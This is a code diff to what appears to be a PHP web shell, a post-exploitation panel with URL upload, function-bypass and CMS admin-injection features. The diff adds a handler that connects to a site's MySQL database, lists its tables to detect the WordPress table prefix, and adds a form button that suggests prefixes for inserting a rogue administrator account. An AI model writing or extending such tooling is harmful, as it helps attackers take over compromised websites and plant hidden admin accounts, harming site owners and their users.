@@ -143,6 +143,7 @@ $msg = '';
 $bypass_output = '';
 $gs_output = '';
 $cms_admin_msg = '';
+$cms_prefix_suggestions = array();
 
 // === UPLOAD FROM URL ===
 if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
@@ -429,6 +430,65 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
                         $uid = mysql_insert_id();
                         $cms_admin_msg = 'vBulletin admin user inserted ID '.$uid.' (minimal fields).';
                     }
+                }
+            }
+        }
+    }
+}
+
+// === DETECT WORDPRESS TABLE PREFIX HANDLER ===
+if (isset($_POST['cms_detect_prefix'])) {
+    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
+    $dbn  = isset($_POST['db_name']) ? $_POST['db_name'] : '';
+    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
+    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
+    if ($dbn === '' || $user === '') {
+        $cms_admin_msg = 'Cannot detect: DB name / user empty.';
+    } else {
+        $link = @mysql_connect($host, $user, $pass);
+        if (!$link) {
+            $cms_admin_msg = 'Detect failed: connect error.';
+        } elseif (!@mysql_select_db($dbn, $link)) {
+            $cms_admin_msg = 'Detect failed: select DB error.';
+        } else {
+            $res = @mysql_query('SHOW TABLES', $link);
+            if (!$res) {
+                $cms_admin_msg = 'Detect failed: cannot list tables.';
+            } else {
+                $candidates = array();
+                while ($row = mysql_fetch_row($res)) {
+                    $t = $row[0];
+                    if (preg_match('/^(.+)_users$/', $t, $m)) {
+                        $prefix = $m[1] . '_';
+                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                        $candidates[$prefix]['users'] = true;
+                    } elseif (preg_match('/^(.+)_usermeta$/', $t, $m)) {
+                        $prefix = $m[1] . '_';
+                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                        $candidates[$prefix]['usermeta'] = true;
+                    } elseif (preg_match('/^(.+)_options$/', $t, $m)) {
+                        $prefix = $m[1] . '_';
+                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                        $candidates[$prefix]['options'] = true;
+                    } elseif (preg_match('/^(.+)_posts$/', $t, $m)) {
+                        $prefix = $m[1] . '_';
+                        if (!isset($candidates[$prefix])) $candidates[$prefix] = array('users'=>false,'usermeta'=>false,'options'=>false,'posts'=>false,'count'=>0);
+                        $candidates[$prefix]['posts'] = true;
+                    }
+                }
+                foreach ($candidates as $p=>$info) {
+                    $candidates[$p]['count'] = ($info['users']?1:0)+($info['usermeta']?1:0)+($info['options']?1:0)+($info['posts']?1:0);
+                }
+                // sort by count desc
+                uasort($candidates, function($a,$b){ return $b['count'] - $a['count']; });
+                $cms_prefix_suggestions = array_keys($candidates);
+                if (count($cms_prefix_suggestions) === 0) {
+                    $cms_admin_msg = 'No WP-like tables found.';
+                } elseif (count($cms_prefix_suggestions) === 1) {
+                    $_SESSION['cms_parsed']['prefix'] = $cms_prefix_suggestions[0];
+                    $cms_admin_msg = 'Detected prefix: '.$cms_prefix_suggestions[0];
+                } else {
+                    $cms_admin_msg = 'Multiple candidates: '.implode(', ', $cms_prefix_suggestions);
                 }
             }
         }
@@ -1399,6 +1459,18 @@ if (!$disabled_funcs) {
                     <div>
                         <label>Table Prefix</label>
                         <input type="text" name="table_prefix" class="form-control" value="<?php echo isset($prefill['prefix'])?htmlspecialchars($prefill['prefix']):'wp_'; ?>">
+                    </div>
+                    <div style="display:flex;flex-direction:column;gap:6px;">
+                        <label style="opacity:0;">&nbsp;</label>
+                        <button type="submit" name="cms_detect_prefix" class="btn" style="background:#6366f1;">🧪 Detect Prefix</button>
+                        <?php if (!empty($cms_prefix_suggestions)): ?>
+                            <div style="font-size:11px;color:#9fb7d8;line-height:1.4;max-width:220px;">
+                                <strong>Suggestions:</strong><br>
+                                <?php foreach ($cms_prefix_suggestions as $pp): ?>
+                                    <a href="#" onclick="this.closest('form').querySelector('[name=table_prefix]').value='<?php echo htmlspecialchars($pp); ?>';return false;" style="color:#93c5fd;text-decoration:none;display:inline-block;margin:2px 4px 0 0;"><?php echo htmlspecialchars($pp); ?></a>
+                                <?php endforeach; ?>
+                            </div>
+                        <?php endif; ?>
                     </div>
                     <div>
                         <label>Admin User</label>
